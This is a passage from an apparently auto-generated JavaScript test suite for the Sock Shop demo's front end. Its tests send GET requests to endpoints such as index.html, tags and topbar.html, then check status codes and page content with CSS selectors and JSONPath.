            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#copyright div.container div p.pull-left a", text)).toContain("Weaveworks");
    })
    .then((data) => {
    });
});

describe.each(dataset("data/64/dataset_64.json"))("test_064_get_index_html", (amp_cache_transform, findcli, postman_token) => {
    it("test_064_get_index_html", () => {
        clearSession();

        // GET http://front-end.sock-shop/index.html (endp 64)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/index.html" + urlencode([["findcli", findcli]]), {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
        })
        .then((data) => {
        });
    });
});

it("test_240_get_ipinfo_io", () => {
    clearSession();

    // GET http://front-end.sock-shop/ipinfo.io (endp 240)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/ipinfo.io")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});

it("test_041_get_tags", () => {
    clearSession();

    // GET http://front-end.sock-shop/tags (endp 41)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/tags", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
    })
    .then((data) => {
    });
});

describe.each(dataset("data/71/dataset_71.json"))("test_071_get_tags", (amp_cache_transform, postman_token) => {
    it("test_071_get_tags", () => {
        clearSession();

        // GET http://front-end.sock-shop/tags (endp 71)
        const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
        return front_end_sock_shop.fetch("/tags", {
            headers: {
                "amp-cache-transform": amp_cache_transform,
                "postman-token": postman_token,
                "x-requested-with": "XMLHttpRequest"
            }
        })
        .then((response) => {
            expect(response.status).toEqual(200);
            return response.text();
        })
        .then((text) => {
            return JSON.parse(text);
        })
        .then((data) => {
            expect(JSONPath({
                path: "$.tags[*]",
                json: data
            })).not.toBeNull();
        });
    });
});

it("test_042_get_topbar_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/topbar.html (endp 42)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/topbar.html", {
        headers: {
            "x-requested-with": "XMLHttpRequest"
        }
    })
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#top div.container div.offer a.btn.btn-success", text)).toContain("Offer of the day");
    })
    .then((data) => {
    });
});

it("test_243_get_www_99syn_com_index_html", () => {
    clearSession();

    // GET http://front-end.sock-shop/www.99syn.com/index.html (endp 243)
    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
    return front_end_sock_shop.fetch("/www.99syn.com/index.html")
    .then((response) => {
        expect(response.status).toEqual(200);
        return response.text();
    })
    .then((text) => {
        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
    })
    .then((data) => {
    });
});
